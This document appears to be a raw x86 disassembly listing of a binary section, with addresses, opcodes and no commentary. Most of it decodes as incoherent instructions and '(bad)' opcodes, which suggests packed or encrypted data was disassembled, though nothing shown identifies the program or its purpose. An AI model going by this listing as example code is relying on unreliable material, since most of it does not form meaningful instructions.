  40c872:	test   DWORD PTR [ecx+eiz*8+0x157907c9],ecx
  40c879:	test   eax,edi
  40c87b:	adc    eax,0xa6c0887d
  40c880:	test   DWORD PTR [ebx+0x5844321],esi
  40c886:	(bad)  
  40c887:	xchg   esp,eax
  40c888:	dec    ebp
  40c889:	mov    al,BYTE PTR [esi]
  40c88b:	xchg   DWORD PTR [ebp+ecx*1+0x58],ebp
  40c88f:	retf   
  40c890:	and    dh,0x54
  40c893:	loop   0x40c819
  40c895:	and    ebx,DWORD PTR [ebp-0x7c5ed322]
  40c89b:	fisttp QWORD PTR ds:0x2f38f38b
  40c8a1:	bound  ebp,QWORD PTR ds:0x82566793
  40c8a7:	push   es
  40c8a8:	out    0x6d,al
  40c8aa:	shl    DWORD PTR [esi-0x18],0xcf
  40c8ae:	pop    ss
  40c8af:	mov    eax,0xa622d831
  40c8b4:	mov    ecx,0xbfe36f95
  40c8b9:	jns    0x40c924
  40c8bb:	lahf   
  40c8bc:	mov    eax,0xf3d7a158
  40c8c1:	stos   DWORD PTR es:[edi],eax
  40c8c2:	scas   eax,DWORD PTR es:[edi]
  40c8c3:	ror    DWORD PTR [edi+0x12],cl
  40c8c6:	clc    
  40c8c7:	mul    BYTE PTR [edi+edx*1+0x5d]
  40c8cb:	shr    eax,cl
  40c8cd:	xlat   BYTE PTR ds:[ebx]
  40c8ce:	repnz xor BYTE PTR [ecx+0x2213317b],al
  40c8d5:	xchg   ebp,eax
  40c8d6:	xchg   ebx,eax
  40c8d7:	dec    esp
  40c8d8:	cmp    esp,eax
  40c8da:	jg     0x40c860
  40c8dc:	sub    bl,BYTE PTR [ebx]
  40c8de:	xor    eax,0xe4b26e39
  40c8e3:	test   BYTE PTR [eax-0x27],dh
  40c8e6:	icebp  
  40c8e7:	jno    0x40c8a8
  40c8e9:	retf   0x997c
  40c8ec:	aam    0x4f
  40c8ee:	lods   eax,DWORD PTR ds:[esi]
  40c8ef:	add    edi,esp
  40c8f1:	add    DWORD PTR [edx],eax
  40c8f3:	loopne 0x40c91b
  40c8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f6:	lods   eax,DWORD PTR ds:[esi]
  40c8f7:	jbe    0x40c94e
  40c8f9:	xchg   ebx,eax
  40c8fa:	lods   al,BYTE PTR ds:[esi]
  40c8fb:	sbb    al,0xb9
  40c8fd:	clc    
  40c8fe:	loopne 0x40c975
  40c900:	mov    eax,0x4a605ef9
  40c905:	jl     0x40c986
  40c907:	imul   ebx,DWORD PTR [esp+ebp*2],0x182adf1b
  40c90e:	ja     0x40c972
  40c910:	xchg   esi,eax
  40c911:	xchg   esp,eax
  40c912:	mov    ch,0x7f
  40c914:	adc    BYTE PTR [eax+0xf37720b],bl
  40c91a:	inc    esi
  40c91b:	shr    BYTE PTR [edx+0x5f63bdf7],cl
  40c921:	es mov esi,0xb9a14495
  40c927:	mov    ecx,DWORD PTR [ebp-0x14]
  40c92a:	mov    cl,BYTE PTR [eax+ecx*1]
  40c92d:	mov    eax,DWORD PTR [ebp-0x34]
  40c930:	or     BYTE PTR [eax],cl
  40c932:	mov    eax,DWORD PTR [ebp+0x10]
  40c935:	mov    ecx,eax
  40c937:	jmp    0x40cec1
  40c93c:	and    DWORD PTR [edx],ebp
  40c93e:	sbb    cl,BYTE PTR ds:0x1a21fd20
  40c944:	in     al,dx
  40c945:	and    al,0xf9
  40c947:	push   0xb430c898
  40c94c:	jae    0x40c918
  40c94e:	push   ss
  40c94f:	push   ss
  40c950:	cmp    eax,0x51161604
  40c955:	push   ss
  40c956:	(bad)  
  40c957:	out    dx,al
  40c958:	mov    BYTE PTR [esi-0x1ee735a0],bh
  40c95e:	push   es
  40c95f:	sbb    BYTE PTR [edi],0x75
  40c962:	fistp  QWORD PTR [edx-0x7f]
  40c965:	mov    ch,0x2f
  40c967:	inc    esi
  40c968:	les    eax,FWORD PTR [edi]
  40c96a:	and    eax,0x5e90dd3a
  40c96f:	mov    bl,0x90
  40c971:	sub    esi,eax
  40c973:	arpl   WORD PTR [edx+edx*8],bx
  40c976:	adc    al,0x54
  40c978:	xor    DWORD PTR [edi+eiz*8],edx
  40c97b:	cmp    esp,edi
  40c97d:	into   
  40c97e:	xchg   ecx,eax
  40c97f:	adc    al,0xb2
  40c981:	in     al,dx
  40c982:	add    al,0x2a
  40c984:	push   ecx
  40c985:	ins    BYTE PTR es:[edi],dx
  40c986:	xlat   BYTE PTR ds:[ebx]
  40c987:	xchg   DWORD PTR [esi+ebx*1],ecx
  40c98a:	shr    ah,cl
  40c98c:	jno    0x40c90f
  40c98e:	stos   DWORD PTR es:[edi],eax
  40c98f:	rcr    dh,cl
  40c991:	and    eax,esi
  40c993:	(bad)  
  40c994:	(bad)  
  40c995:	jo     0x40c9e0
  40c997:	shr    bh,1
  40c999:	mov    esp,0x99fab831
  40c99e:	adc    BYTE PTR [ecx+edx*8-0x2c],ch
  40c9a2:	xchg   edx,eax
  40c9a3:	ror    cl,0xd7
  40c9a6:	dec    ebp
  40c9a7:	repz inc sp
  40c9aa:	out    dx,al
  40c9ab:	xchg   ecx,eax
  40c9ac:	test   eax,0x8b189404
  40c9b1:	adc    BYTE PTR [edi-0x8],cl
  40c9b4:	rol    BYTE PTR [esi+0x128e3ed8],0xac
  40c9bb:	lea    ecx,[edi-0x660e4e4f]
  40c9c1:	sbb    eax,DWORD PTR [edx]
  40c9c3:	ret    
  40c9c4:	dec    esp
  40c9c5:	mov    dh,0xcb
  40c9c7:	shl    edx,0x9f
  40c9ca:	dec    esp
  40c9cb:	xchg   edx,eax
  40c9cc:	sahf   
  40c9cd:	or     BYTE PTR [ebx],al
  40c9cf:	and    al,0xb0
  40c9d1:	mov    ebp,0x21424223
  40c9d6:	hlt    
  40c9d7:	add    edi,DWORD PTR [ecx+0x65]
  40c9da:	ficomp WORD PTR [edx-0x5640aa44]
  40c9e0:	mov    ch,0x3d
  40c9e2:	out    0xba,al
  40c9e4:	sbb    BYTE PTR [ebx],dl
  40c9e6:	sar    DWORD PTR [esi],1
  40c9e8:	arpl   dx,bp
  40c9ea:	or     al,0x7e
  40c9ec:	stc    
  40c9ed:	(bad)  
  40c9ef:	mov    bh,0xf1
  40c9f1:	loopne 0x40ca23
  40c9f3:	mov    WORD PTR [edi+eiz*1+0x6ad40b08],gs
  40c9fa:	add    al,BYTE PTR [esi+0x28]
  40c9fd:	repnz retf 0x37b5
  40ca01:	stos   BYTE PTR es:[edi],al
  40ca02:	mov    ds:0x53d76401,eax
  40ca07:	mov    edi,0x4453b606
  40ca0c:	dec    esp
  40ca0d:	mov    DWORD PTR [esp+esi*2+0x51346182],0x5631af9d
  40ca18:	mov    eax,ds:0x5b74ee61
  40ca1d:	in     al,0x90
  40ca1f:	push   eax
  40ca20:	inc    esp
  40ca21:	in     eax,dx
  40ca22:	adc    edi,DWORD PTR [edi+0x1c6ea515]
  40ca28:	jnp    0x40c9e9
  40ca2a:	or     cl,BYTE PTR [ebx+0x33]
  40ca2d:	dec    esp
  40ca2e:	hlt    
  40ca2f:	mov    bh,0xc
  40ca31:	and    BYTE PTR [eax+0x32],al
  40ca34:	push   esi
  40ca35:	add    eax,0xb5fa181
  40ca3a:	idiv   BYTE PTR [ebp-0x24]
  40ca3d:	in     eax,0x82
  40ca3f:	dec    edx
  40ca40:	fld    TBYTE PTR [edx+0x5e]
  40ca43:	jmp    0xe37db334
  40ca48:	xchg   ecx,eax
  40ca49:	(bad)  
  40ca4c:	or     al,BYTE PTR [ebx-0x6c3b6fcb]
  40ca52:	jge    0x40c9d9
  40ca54:	mov    bl,0x32
  40ca56:	and    ebp,DWORD PTR [ebx]
  40ca58:	sbb    al,0x4d
  40ca5a:	cld    
  40ca5b:	icebp  
  40ca5c:	cmp    ah,BYTE PTR [ecx-0x39b672e5]
  40ca62:	test   DWORD PTR [esi],esi
  40ca64:	pop    edi
  40ca65:	pop    ss
  40ca66:	frstor [ebx]
  40ca68:	dec    di
  40ca6a:	and    DWORD PTR [edi],0xffffffad
  40ca6d:	pop    ebp
  40ca6e:	inc    eax
  40ca6f:	mov    dh,0x1
  40ca71:	add    al,0xf7
  40ca73:	mov    edx,0x5df6a432
  40ca78:	jp     0x40ca45
  40ca7a:	stos   BYTE PTR es:[edi],al
  40ca7b:	loop   0x40ca6c
  40ca7d:	mov    eax,0xc9192b1f
  40ca82:	dec    ecx
  40ca83:	cwde   
  40ca84:	ret    
  40ca85:	fcom   DWORD PTR [ebx-0x7e557d98]
  40ca8b:	push   es
  40ca8c:	sub    edx,ecx
  40ca8e:	inc    esi
  40ca8f:	bound  ebx,QWORD PTR [ecx+edi*4]
  40ca92:	and    bl,dh
  40ca94:	ins    DWORD PTR es:[edi],dx
  40ca95:	mul    BYTE PTR [ebp+0x7672f5c9]
  40ca9b:	inc    edx
  40ca9c:	adc    al,0x8e
  40ca9e:	jg     0x40cacd
  40caa0:	sub    DWORD PTR [eax+0x70],ecx
  40caa3:	ins    BYTE PTR es:[edi],dx
  40caa4:	int3   
  40caa5:	xor    DWORD PTR [ecx-0x7522a137],ebp
  40caab:	dec    ebx
  40caac:	sbb    ecx,ecx
  40caae:	jl     0x40caa4
  40cab0:	(bad)  
  40cab1:	xchg   ebx,eax
  40cab2:	out    0x78,eax
  40cab4:	xchg   esp,eax
  40cab5:	leave  
  40cab6:	xor    bl,dh
  40cab8:	stos   BYTE PTR es:[edi],al
  40cab9:	inc    ecx
  40caba:	and    dh,bl
  40cabc:	sbb    ebx,DWORD PTR [eax+0x6559d9b5]
  40cac2:	add    BYTE PTR [edi+0xc],al
  40cac5:	mov    dh,0xf7
  40cac7:	(bad)  
  40cac8:	rcr    BYTE PTR [ebp+0x5a],1
  40cacb:	dec    edx
  40cacc:	dec    edi
  40cacd:	xchg   edx,eax
  40cace:	loopne 0x40ca90
  40cad0:	jno    0x40caf4
  40cad2:	std    
  40cad3:	mov    ds:0xe5e807fa,al
  40cad8:	pop    ebx
  40cad9:	dec    esi
  40cada:	loope  0x40ca72
  40cadc:	fild   QWORD PTR [ecx-0x2f]
  40cadf:	test   DWORD PTR [eax+0x56bc7dec],esi
  40cae5:	nop
  40cae6:	aam    0xab
  40cae8:	push   ds
  40cae9:	add    BYTE PTR [bx+di-0x2776],bl
  40caee:	sbb    BYTE PTR [esi],al
  40caf0:	xchg   ecx,eax
  40caf1:	ret    
  40caf2:	les    esi,FWORD PTR [edi+0x7af7ca65]
  40caf8:	arpl   WORD PTR [ebx-0x4a],si
  40cafb:	xchg   ebp,eax
  40cafc:	pop    es
  40cafd:	jb     0x40caa2
  40caff:	adc    al,0x5
  40cb01:	call   0x94339ae7
  40cb06:	scas   al,BYTE PTR es:[edi]
  40cb07:	enter  0xaae8,0x34
  40cb0b:	inc    ecx
  40cb0c:	fidiv  DWORD PTR [edi+0x6e1ad3be]
  40cb12:	repz ror DWORD PTR [esi],cl
  40cb15:	push   0xbb41f42b
  40cb1a:	xchg   ebp,eax
  40cb1b:	xlat   BYTE PTR ds:[ebx]
  40cb1c:	lds    esi,FWORD PTR [ebp+0x2e]
  40cb1f:	push   ecx
  40cb20:	push   edx
  40cb21:	and    edi,DWORD PTR ss:[esp+edi*1]
  40cb25:	lea    ebp,[edx+0x34c12644]
  40cb2b:	retf   0xbe16
  40cb2e:	ja     0x40cad6
  40cb30:	add    ah,BYTE PTR [edi]
  40cb32:	push   es
  40cb33:	jae    0x40cad9
  40cb35:	lds    eax,FWORD PTR [esi-0x57f7aaa4]
  40cb3b:	ins    DWORD PTR es:[edi],dx
  40cb3c:	push   ecx
  40cb3d:	cmp    bh,BYTE PTR [ebx+0x57]
  40cb40:	out    dx,eax
  40cb41:	(bad)  
  40cb42:	or     al,0x22
  40cb44:	cmc    
  40cb45:	add    al,0x62
  40cb47:	fldenv [ebx]
  40cb49:	mov    edi,DWORD PTR [esi]
  40cb4b:	xchg   BYTE PTR [eax+0x8ae25bd],bh
  40cb51:	pop    ebx
  40cb52:	ins    BYTE PTR es:[edi],dx
  40cb53:	push   es
  40cb54:	pop    ecx
  40cb55:	shl    BYTE PTR [ecx+esi*2-0x59],0xbb
  40cb5a:	jno    0x40cb7f
  40cb5c:	add    DWORD PTR [esi+esi*2],ebx
  40cb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb61:	pop    ds
  40cb62:	jb     0x40cbb9
  40cb64:	pusha  
  40cb65:	ret    
  40cb66:	sub    eax,0xca89b3f
  40cb6b:	stos   BYTE PTR es:[edi],al
  40cb6c:	push   edi
  40cb6d:	sbb    DWORD PTR [esi+0x2024f2b3],ebx
  40cb73:	and    DWORD PTR [edi],ecx
  40cb75:	mov    ds:0xe67f3c4c,eax
  40cb7a:	enter  0xb824,0x44
  40cb7e:	sub    BYTE PTR [ecx+0x59],bl
  40cb81:	dec    eax
  40cb82:	cmp    cl,bh
  40cb84:	pop    es
  40cb85:	ja     0x40cbb8
  40cb87:	jne    0x40cc07
  40cb89:	jno    0x40cbf9
  40cb8b:	cmp    al,dl
  40cb8d:	mov    ebp,0x1c4301fe
  40cb92:	sub    ebx,eax
  40cb94:	lahf   
  40cb95:	lar    ecx,WORD PTR [eax]
  40cb98:	repz pop ebx
  40cb9a:	lods   al,BYTE PTR ds:[esi]
  40cb9b:	lods   eax,DWORD PTR ds:[esi]
  40cb9c:	cmp    DWORD PTR [edi],edi
  40cb9e:	call   0x7e750032
  40cba3:	push   es
  40cba4:	stos   DWORD PTR es:[edi],eax
  40cba5:	jl     0x40cbe7
  40cba7:	or     BYTE PTR [edx+0x4],bh
  40cbaa:	cdq    
  40cbab:	ja     0x40cbc6
  40cbad:	inc    edi
  40cbae:	cld    
  40cbaf:	dec    eax
  40cbb0:	push   edx
  40cbb1:	ror    BYTE PTR [edi+esi*4+0x58],1
  40cbb5:	enter  0xf356,0xb6
  40cbb9:	xchg   ebx,eax
  40cbba:	test   eax,0x21a64796
  40cbbf:	adc    eax,0x277bba5c
  40cbc4:	mov    ah,0x50
  40cbc6:	test   DWORD PTR [eax+0x11],ebp
  40cbc9:	xor    BYTE PTR [edi-0x60],dh
  40cbcc:	stos   DWORD PTR es:[edi],eax
  40cbcd:	fbstp  TBYTE PTR ds:0x90608d06
  40cbd3:	(bad)  
  40cbd4:	cmp    bh,bh
  40cbd6:	xor    dl,BYTE PTR [ebx]
  40cbd8:	xchg   esp,eax
  40cbd9:	loop   0x40cc2f
  40cbdb:	fadd   QWORD PTR [edx+0x28]
  40cbde:	in     al,dx
  40cbdf:	push   ss
  40cbe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbe1:	hlt    
  40cbe2:	xchg   BYTE PTR [eax],ch
  40cbe4:	jge    0x40cbf5
  40cbe6:	jns    0x40cc4f
  40cbe8:	mov    edx,0xe0e8d85d
  40cbed:	dec    edi
  40cbee:	fwait
  40cbef:	outs   dx,BYTE PTR ds:[esi]
  40cbf0:	inc    ecx
  40cbf1:	mov    edi,0x29f8a587
  40cbf6:	and    esp,DWORD PTR [eax]
  40cbf8:	js     0x40cbf0
  40cbfa:	cmp    bh,cl
  40cbfc:	mul    DWORD PTR [ebx]
  40cbfe:	push   edx
  40cbff:	(bad)  
  40cc01:	inc    ecx
  40cc02:	or     ecx,ecx
  40cc04:	neg    BYTE PTR [esi]
  40cc06:	into   
  40cc07:	test   eax,0x7dd86c31
  40cc0c:	xchg   ebp,eax
  40cc0d:	sbb    ebx,esi
  40cc0f:	fs jle 0x40cc78
  40cc12:	ins    DWORD PTR es:[edi],dx
  40cc13:	popa   
  40cc14:	shr    DWORD PTR ds:0x729b6d71,0x72
  40cc1b:	push   cs
  40cc1c:	or     ch,BYTE PTR ds:0xc6a8381e
  40cc22:	sbb    al,0xe4
  40cc24:	arpl   WORD PTR [eax+0x3d],sp
  40cc27:	jg     0x40cc85
  40cc29:	add    dl,0x38
  40cc2c:	pop    esp
  40cc2d:	pop    eax
  40cc2e:	and    eax,0xd7f2c0b8
  40cc33:	add    DWORD PTR [ebx+ebx*2+0x7dcbc8cf],edx
  40cc3a:	(bad)  
  40cc3b:	and    dl,ch
  40cc3d:	sub    BYTE PTR [esi],0x2f
  40cc40:	xchg   ebx,eax
  40cc41:	jmp    0x40ccaa
  40cc43:	leave  
  40cc44:	(bad)  
  40cc45:	loop   0x40cc1c
  40cc47:	mov    eax,ds:0xe2ae142e
  40cc4c:	(bad)  
  40cc4d:	xchg   ebp,eax
  40cc4e:	neg    BYTE PTR [edx+0xc]
  40cc51:	(bad)  
  40cc52:	jecxz  0x40cccd
  40cc54:	adc    cl,bh
  40cc56:	xor    eax,0x1d8dc4c3
  40cc5b:	fsubr  DWORD PTR [ebp+ebp*1-0x7e]
  40cc5f:	loop   0x40cc4e
  40cc61:	in     eax,dx
  40cc62:	and    ebx,DWORD PTR [eax+0x30]
  40cc65:	or     DWORD PTR [edx-0x4ff880b7],ebp
  40cc6b:	and    ebp,DWORD PTR [edi+0xa]
  40cc6e:	in     al,dx
  40cc6f:	fisubr WORD PTR [esi]
  40cc71:	jg     0x40cc0f
  40cc73:	into   
  40cc74:	dec    ebp
  40cc75:	iret   
  40cc76:	push   ds
  40cc77:	scas   al,BYTE PTR es:[edi]
  40cc78:	or     dl,BYTE PTR [eax-0x7b996031]
  40cc7e:	sbb    ebx,ecx
  40cc80:	scas   eax,DWORD PTR es:[edi]
  40cc81:	mov    edx,0xfc700af9
  40cc86:	in     al,dx
  40cc87:	inc    esp
  40cc88:	sbb    edx,DWORD PTR [edi+0x7a6ab76e]
  40cc8e:	inc    edi
  40cc8f:	enter  0x90eb,0x4
  40cc93:	test   DWORD PTR [edx+0x65],edi
  40cc96:	gs xchg edi,eax
  40cc98:	push   ecx
  40cc99:	leave  
  40cc9a:	push   ebx
  40cc9b:	xchg   ecx,eax
  40cc9c:	jns    0x40cc80
  40cc9e:	leave  
  40cc9f:	xchg   ax,ax
  40cca1:	pop    edi
  40cca2:	data16 ins BYTE PTR es:[edi],dx
  40cca4:	mov    esi,0x8f9c5775
  40cca9:	pop    edi
  40ccaa:	mov    cl,0x1d
  40ccac:	mov    bl,0x65
  40ccae:	pusha  
  40ccaf:	aad    0xe2
  40ccb1:	add    dh,ch
  40ccb3:	sti    
  40ccb4:	(bad)  
  40ccb5:	fnstenv [eax-0x4fe3d4b6]
  40ccbb:	dec    eax
  40ccbc:	js     0x40ccdf
  40ccbe:	cmp    eax,0x38536e9c
  40ccc3:	jle    0x40ccd7
  40ccc5:	(bad)  
  40ccc6:	pop    ebp
  40ccc7:	add    BYTE PTR [ecx-0x7e925ac5],ah
  40cccd:	stos   BYTE PTR es:[edi],al
  40ccce:	out    0x12,al
  40ccd0:	dec    ecx
  40ccd1:	clc    
  40ccd2:	enter  0x9991,0x3b
  40ccd6:	js     0x40cc8d
  40ccd8:	jecxz  0x40ccff
  40ccda:	mov    DWORD PTR [edi+0x20],esi
  40ccdd:	mov    ds:0x46067c3f,al
  40cce2:	mov    al,0x58
  40cce4:	lods   eax,DWORD PTR ds:[esi]
  40cce5:	mov    ss,WORD PTR [ebx]
  40cce7:	std    
  40cce8:	rol    ah,1
  40ccea:	call   0xb50e2699
  40ccef:	and    al,BYTE PTR [eax]
  40ccf1:	leave  
  40ccf2:	cmp    dl,BYTE PTR [edx-0x43]
  40ccf5:	jg     0x40cc79
  40ccf7:	xchg   ebp,eax
  40ccf8:	jle    0x40cd5e
  40ccfa:	mov    esp,0xb3b53d1e
  40ccff:	aaa    
  40cd00:	sub    al,0xd3
  40cd02:	cmp    dl,dl
  40cd04:	or     esp,DWORD PTR [eax-0x73ecc4f1]
  40cd0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd0b:	add    eax,0x9c53b410
  40cd10:	lods   al,BYTE PTR ds:[esi]
  40cd11:	mov    cl,0x20
  40cd13:	ss push ss
  40cd15:	push   ds
  40cd16:	sbb    cl,BYTE PTR [eax]
  40cd18:	jg     0x40cd65
  40cd1a:	push   esp
  40cd1b:	adc    esi,DWORD PTR [edx-0x61f390fb]
  40cd21:	inc    DWORD PTR [esi]
  40cd23:	jmp    0x4d46:0x1f204553
  40cd2a:	xchg   ebx,eax
  40cd2b:	and    bh,BYTE PTR [esi]
  40cd2d:	retf   0x6d5
  40cd30:	je     0x40cd55
  40cd32:	ret    0xd1cb
  40cd35:	and    al,0x59
  40cd37:	xchg   BYTE PTR [edx+0x2deb1ac2],cl
  40cd3d:	sahf   
  40cd3e:	test   eax,0xcce6b045
  40cd43:	out    dx,eax
  40cd44:	mov    dl,0x7a
  40cd46:	in     al,dx
  40cd47:	ins    DWORD PTR es:[edi],dx
  40cd48:	push   esp
  40cd49:	stos   BYTE PTR es:[edi],al
  40cd4a:	scas   al,BYTE PTR es:[edi]
  40cd4b:	loopne 0x40cd8c
  40cd4d:	ds jo  0x40cd82
  40cd50:	or     DWORD PTR [ebx+0x1d],eax
  40cd53:	sti    
  40cd54:	les    ebx,FWORD PTR [ebx-0x4e428a28]
  40cd5a:	and    eax,0x7d0ee146
  40cd5f:	test   al,0xa7
  40cd61:	push   ss
  40cd62:	dec    esp
  40cd63:	add    ebx,DWORD PTR [ecx]
  40cd65:	and    ah,BYTE PTR [ebp+0x64d3165d]
  40cd6b:	rcr    BYTE PTR [ebp+0x48],cl
  40cd6e:	shl    eax,cl
  40cd70:	ror    BYTE PTR fs:[edx+0x75f1d790],0xf8
  40cd78:	mov    ch,0x32
  40cd7a:	in     al,dx
  40cd7b:	mov    ds:0x1a2f7397,al
  40cd80:	mov    eax,ds:0x12f2a717
  40cd85:	iret   
  40cd86:	pop    ss
  40cd87:	xchg   esp,eax
  40cd88:	or     DWORD PTR [edx+0x4e866a0a],edx
  40cd8e:	mov    ds:0x93a870ce,eax
  40cd93:	in     eax,dx
  40cd94:	popf   
  40cd95:	popa   
  40cd96:	xchg   ebp,eax
  40cd97:	mov    al,bh
  40cd99:	sub    bl,dh
  40cd9b:	sbb    al,0x6
  40cd9d:	rcl    BYTE PTR ds:0x1c60b32b,cl
  40cda3:	push   ecx
  40cda5:	out    dx,eax
  40cda6:	mov    ds:0xf53ec54b,al
  40cdab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdac:	(bad)  
  40cdad:	mov    cl,0xd
  40cdaf:	popa   
  40cdb0:	jl     0x40cd9d
  40cdb2:	mov    bh,0xaa
  40cdb4:	mov    edi,0x1b8b4430
  40cdb9:	sbb    ecx,DWORD PTR [ebx+0x48]
  40cdbc:	cld    
  40cdbd:	or     eax,esp
  40cdbf:	and    cl,BYTE PTR [edi]
  40cdc1:	aam    0xa7
  40cdc3:	inc    esp
  40cdc4:	add    BYTE PTR [eax-0x4bc2eb36],ch
  40cdca:	loop   0x40cd56
  40cdcc:	jmp    0x364b5db1
  40cdd1:	clc    
  40cdd2:	and    al,0xdc
  40cdd4:	mov    eax,ds:0xad77b432
  40cdd9:	dec    esi
  40cdda:	adc    ebp,DWORD PTR [eax-0x6]
  40cddd:	push   ecx
  40cdde:	jmp    0x7234:0x70a4e37b
  40cde5:	sub    cl,ch
  40cde7:	stc    
  40cde8:	mov    dh,0x8a
  40cdea:	dec    eax
  40cdeb:	jmp    0x53e22319
  40cdf0:	jg     0x40cd8a
  40cdf2:	mov    edx,0x2f9073f0
  40cdf7:	lods   eax,DWORD PTR ds:[esi]
  40cdf8:	(bad)  
  40cdf9:	out    dx,eax
  40cdfa:	inc    edi
  40cdfb:	sbb    eax,0x98912d0e
  40ce00:	scas   al,BYTE PTR es:[edi]
  40ce01:	mov    DWORD PTR [ebp+0x6bca3ba8],edi
  40ce07:	inc    ebx
  40ce08:	dec    ebx
  40ce09:	jne    0x40ce21
  40ce0b:	(bad)  
  40ce0c:	imul   esp,ebp,0x21ba73db
  40ce12:	add    DWORD PTR [esi+0x55ca6d76],edx
  40ce18:	sti    
  40ce19:	fidivr WORD PTR [eax-0x59739dd3]
  40ce1f:	pop    es
  40ce20:	and    eax,0x8b5d1c60
  40ce25:	out    0x10,eax
  40ce27:	pop    ecx
  40ce28:	sbb    al,0xba
  40ce2a:	push   edi
  40ce2b:	stos   BYTE PTR es:[edi],al
  40ce2c:	push   es
  40ce2d:	xor    BYTE PTR [ebx+0x0],dh
  40ce30:	out    dx,al
  40ce31:	and    BYTE PTR [ecx-0x6b216585],cl
  40ce37:	sbb    eax,DWORD PTR [ebx-0x52]
  40ce3a:	pop    es
  40ce3b:	inc    ecx
  40ce3c:	mov    ah,0x78
  40ce3e:	repz and al,0x82
  40ce41:	add    eax,0x3b1fedd9
  40ce46:	mov    BYTE PTR [eax-0xccdfe9e],ah
  40ce4c:	fmul   st,st(6)
  40ce4e:	stos   DWORD PTR es:[edi],eax
  40ce4f:	jae    0x40ce7a
  40ce51:	in     eax,0x97
  40ce53:	inc    ecx
  40ce54:	cmp    eax,0x828232ff
  40ce59:	loopne 0x40ce12
  40ce5b:	mov    bl,0xf3
  40ce5d:	xchg   edx,eax
  40ce5e:	lock push 0x66a30f55
  40ce64:	push   ebx
  40ce65:	or     BYTE PTR es:[ecx+eax*4],ah
  40ce69:	or     al,0x1c
  40ce6b:	rcr    DWORD PTR ds:0x30616173,cl
  40ce71:	stc    
  40ce72:	mov    bh,0xf8
  40ce74:	fs repz push cs
  40ce77:	adc    BYTE PTR [eax-0x69],dl
  40ce7a:	es adc bh,0xa
  40ce7e:	mov    gs,WORD PTR [edi-0x2a]
  40ce81:	sti    
  40ce82:	test   ebx,ebx
  40ce84:	add    BYTE PTR [edi-0x1cd39bd9],al
  40ce8a:	dec    ebx
  40ce8b:	mov    DWORD PTR [ebp-0x2c],eax
  40ce8e:	mov    edi,0xe9320de6
  40ce93:	pusha  
  40ce94:	cdq    
  40ce95:	rol    DWORD PTR [ecx+0x73453993],1
  40ce9b:	arpl   WORD PTR [ebx-0x61d138e4],bx
  40cea1:	cmp    BYTE PTR [esi],ch
  40cea3:	loopne 0x40ceac
  40cea5:	ja     0x40ce45
  40cea7:	add    WORD PTR [edx-0x201b7e09],0x54
  40ceaf:	sub    DWORD PTR [edi-0x75],eax
  40ceb2:	je     0x40ce93
  40ceb4:	test   eax,0xcb04bfa0
  40ceb9:	mov    edi,0x72b4c8f1
  40cebe:	sahf   
  40cebf:	popf   
  40cec0:	push   ecx
  40cec1:	shrd   ecx,edx,0x2
  40cec5:	shl    eax,0x1e
  40cec8:	shr    edx,0x2
  40cecb:	mov    DWORD PTR [ebp+0x14],edx
  40cece:	mov    DWORD PTR [ebp+0x14],eax
  40ced1:	xor    edx,edx
  40ced3:	mov    eax,ecx
  40ced5:	xor    eax,edi
  40ced7:	or     eax,edx
  40ced9:	mov    edx,DWORD PTR [ebp-0x4]
  40cedc:	jmp    0x40d466
  40cee1:	lock jae 0x40cef2
  40cee4:	mov    ebp,0x13994155
  40cee9:	enter  0x8c7b,0x6e
  40ceed:	dec    ebx
  40ceee:	mov    ds:0xc8a8b4ed,eax
  40cef3:	push   ss
  40cef4:	push   ss
  40cef5:	cmp    eax,0xe9161604
  40cefa:	mov    edx,ecx
  40cefc:	in     eax,0x9e
  40cefe:	sbb    BYTE PTR [eax+0x21],bh
  40cf01:	pop    edi
  40cf02:	cmp    al,0x24
  40cf04:	inc    BYTE PTR [edx]
  40cf06:	xor    eax,0x4629a6d8
  40cf0b:	xchg   ebp,eax
  40cf0c:	dec    ecx
  40cf0d:	bnd call 0x176ddef3
  40cf13:	push   ss
  40cf14:	xchg   ebp,eax
  40cf15:	ret    
  40cf16:	xadd   DWORD PTR [eax+eax*4],ebp
  40cf1a:	in     eax,0x53
  40cf1c:	rcl    DWORD PTR [eax+edi*2-0x39],cl
  40cf20:	xor    al,cl
  40cf22:	inc    edi
  40cf23:	xor    ch,dh
  40cf25:	pop    ebp
  40cf26:	mov    ebp,DWORD PTR ds:0x629eb1e8
  40cf2c:	cmp    bh,0x1a
  40cf2f:	adc    edi,DWORD PTR [eax-0x396f4a9]
  40cf35:	xchg   al,dl
  40cf37:	popf   
  40cf38:	add    eax,0xbb74f858
  40cf3d:	cmc    
  40cf3e:	cmc    
  40cf3f:	cli    
  40cf40:	fild   DWORD PTR ds:0xac5ef612
  40cf46:	jbe    0x40cfb5
  40cf48:	out    0x90,al
  40cf4a:	dec    eax
  40cf4b:	push   edi
  40cf4c:	fwait
  40cf4d:	xchg   DWORD PTR [edi-0x4885ec6d],ebx
  40cf53:	push   eax
  40cf54:	popf   
  40cf55:	sub    BYTE PTR [edi],ch
  40cf57:	xlat   BYTE PTR ds:[ebx]
  40cf58:	xchg   BYTE PTR [edx],dl
  40cf5a:	jmp    0xbf652271
  40cf5f:	les    ebp,FWORD PTR [esi-0x3e06aa86]
  40cf65:	in     eax,dx
  40cf66:	xchg   esi,eax
  40cf67:	jecxz  0x40cfaf
  40cf69:	cmc    
  40cf6a:	cpuid  
  40cf6c:	repz pushf 
  40cf6e:	ins    BYTE PTR es:[edi],dx
  40cf6f:	push   0x836d9e2d
  40cf74:	ins    BYTE PTR es:[edi],dx
  40cf75:	inc    ecx
  40cf76:	test   al,0x6e
  40cf78:	mov    cl,0xc6
  40cf7a:	inc    esp
  40cf7b:	out    dx,eax
  40cf7c:	(bad)  
  40cf7d:	xchg   esi,eax
  40cf7e:	jp     0x40cf35
  40cf80:	inc    ebp
  40cf81:	sub    BYTE PTR [ecx],cl
  40cf83:	ret    0x1232
  40cf86:	test   BYTE PTR [eax-0x12],0x8
  40cf8a:	pop    esi
  40cf8b:	hlt    
  40cf8c:	loop   0x40cf51
  40cf8e:	jmp    0x40cf44
  40cf90:	xchg   esi,eax
  40cf91:	(bad)  [esp+edx*8]
  40cf94:	inc    eax
  40cf95:	das    
  40cf96:	mov    gs,WORD PTR [edi]
